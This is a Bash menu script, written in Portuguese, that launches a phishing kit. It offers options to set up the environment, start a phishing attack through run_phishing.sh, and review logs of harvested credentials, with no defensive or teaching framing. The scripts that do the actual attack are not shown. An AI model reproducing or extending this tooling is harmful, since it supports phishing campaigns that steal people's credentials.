#!/bin/bash

while true; do
    clear
    echo "=============================="
    echo "    Menu de Automação"
    echo "=============================="
    echo "1) Configurar ambiente"
    echo "2) Iniciar ataque de phishing"
    echo "3) Verificar logs de credenciais"
    echo "4) Sair"
    echo "=============================="
    read -p "Escolha uma opção: " OPTION

    case $OPTION in
        1)
            bash setup_environment.sh
            ;;
        2)
            bash run_phishing.sh
            ;;
        3)
            bash check_logs.sh
            echo "Pressione Enter para voltar ao menu..."
            read
            ;;
        4)
            echo "Saindo..."
            exit 0
            ;;
        *)
            echo "Opção inválida. Tente novamente."
            sleep 2
            ;;
    esac
done
